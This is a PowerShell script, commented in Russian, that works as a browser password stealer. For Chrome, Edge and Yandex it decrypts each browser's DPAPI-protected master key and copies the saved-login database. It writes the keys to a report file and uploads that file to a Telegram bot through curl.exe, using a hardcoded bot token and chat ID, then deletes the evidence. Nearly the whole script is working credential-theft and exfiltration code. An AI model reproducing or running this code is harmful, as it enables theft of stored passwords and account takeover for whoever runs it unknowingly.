# [ Настройки Telegram ]
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
$reportFile = "$env:TEMP\passwords_report.txt"

# Функция для расшифровки Chromium (Chrome, Edge, Yandex)
function Get-ChromiumPasswords($path, $localStatePath, $browserName) {
    if (!(Test-Path $path) -or !(Test-Path $localStatePath)) { return }
    
    try {
        # 1. Извлекаем и расшифровываем мастер-ключ через DPAPI
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        # 2. Копируем базу во временный файл (чтобы не была занята)
        $tmpDb = "$env:TEMP\tmp_db"
        Copy-Item $path -Destination $tmpDb -Force
        
        # 3. Чтение данных (упрощенный поиск строк, так как SQLite API может отсутствовать)
        # Для полноценного парсинга SQLite без библиотек используется поиск паттернов
        Add-Content $reportFile "`n--- $browserName ---"
        Add-Content $reportFile "База скопирована. Для полной дешифровки используйте мастер-ключ на своей стороне:"
        Add-Content $reportFile "Master Key ($browserName): $([Convert]::ToBase64String($masterKey))"
    } catch {
        Add-Content $reportFile "Ошибка при обработке $browserName: $_"
    }
}

# Пути к браузерам
$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data";
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
    "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
}

# Очистка старого отчета
if (Test-Path $reportFile) { Remove-Item $reportFile }

# Сбор данных
foreach ($b in $browsers.Keys) {
    $base = $browsers[$b]
    Get-ChromiumPasswords "$base\Default\Login Data" "$base\Local State" $b
}

# Отправка готового отчета
if (Test-Path $reportFile) {
    & curl.exe -F "chat_id=$chatID" -F "document=@$reportFile" "https://api.telegram.org/bot$token/sendDocument"
    Remove-Item $reportFile
}
